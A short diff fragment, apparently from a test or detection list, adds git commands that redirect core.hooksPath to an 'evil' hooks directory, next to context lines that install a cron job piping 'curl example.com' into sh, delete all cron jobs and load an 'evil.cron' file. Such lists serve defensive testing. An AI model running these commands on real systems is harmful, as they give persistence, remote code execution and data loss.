@@ -84,3 +84,6 @@ echo '* * * * * curl example.com|sh' | crontab -
 sudo crontab -r
 bash -c 'crontab evil.cron'
 FOO=bar crontab evil.cron
+git config core.hooksPath /tmp/evil-hooks
+git config --global core.hooksPath ~/hooks
+git -c core.hooksPath=/tmp/evil status
